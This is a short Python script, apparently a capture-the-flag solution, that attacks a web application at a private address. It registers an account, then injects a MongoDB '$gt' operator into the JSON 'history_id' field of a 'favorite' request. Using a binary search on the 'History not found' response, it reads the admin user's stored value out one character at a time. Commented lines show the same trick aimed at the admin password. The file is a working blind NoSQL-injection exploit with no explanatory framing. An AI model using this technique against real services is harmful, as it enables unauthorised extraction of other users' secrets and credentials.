import requests
import uuid
import string

url = "http://10.99.210.103:8019/"

username = str(uuid.uuid4())
password = str(uuid.uuid4())

s = requests.Session()

s.post(url + "register", json={"username": username, "password": password})
s.post(url + "login", json={"username": username, "password": password})

words = sorted(string.printable)

del words[words.index("|")]
print(words)
flag = ""

while not flag.endswith("}"):
    lb = 0
    rb = len(words)
    while lb + 1 < rb:
        mid = (lb + rb) // 2
        payload = {
            "history_id": {
                "username": "admin",
                "generated_payload": {"$gt": f"{flag}{words[mid]}"},
            }
        }
        r = s.post(url + "favorite", json=payload)
        if "History not found" not in r.text:
            lb = mid
        else:
            rb = mid
    flag += words[lb]

    print(flag)
    # for word in words:
    #     payload = {"username": "admin", "password": {"$gt": f"^{flag}{word}"}}
    #     payload = {"history_id":{"username":"admin","generated_payload":{"$gt":f"^{flag}{word}"}}}
    #     r = s.post(url+'favorite', json=payload)
    #     if "History not found" in r.text:
    #         flag += word
    #         print(flag)
    #         break

print(flag)
